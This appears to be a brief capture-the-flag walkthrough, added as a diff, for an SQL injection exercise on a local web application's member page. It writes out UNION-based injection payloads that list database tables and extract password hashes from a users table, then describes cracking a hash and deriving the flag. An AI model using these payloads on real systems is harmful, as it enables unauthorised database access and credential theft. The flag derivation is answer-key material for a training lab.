@@ -1,0 +1,10 @@
+Page : http://localhost:8080/index.php?page=member
+
+To get tables names => 
+1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+To request on the SQL_INJECTION Table =>
+1 AND 1=2 UNION SELECT Countersign, COMMENTAIRE FROM Member_Sql_Injection.users 
+
+Password decrypted via : https://md5hashing.net/hash/sha256
+
+Then found FortyTwo, lowered its characters and sha256 on it to get the flag
